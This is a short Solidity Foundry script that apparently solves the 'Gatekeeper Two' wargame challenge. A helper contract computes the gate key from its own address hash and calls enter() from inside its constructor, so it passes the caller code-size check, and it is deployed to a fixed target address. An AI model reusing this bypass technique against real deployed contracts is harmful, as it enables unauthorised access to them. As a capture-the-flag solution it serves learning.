// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/Gatekeeper_2.sol";

contract Hacker {
    constructor(GatekeeperTwo code) {
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ type(uint64).max;

        bytes8 key = bytes8(k);
        require(code.enter(key), "Failed");
    }
}

contract GateKeeperScript is Script {
    GatekeeperTwo code = GatekeeperTwo(0x6EbA3AC2b3FF5164f0D84B3B9f5F254101F68822);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        new Hacker(code);
        vm.stopBroadcast();
    }
}
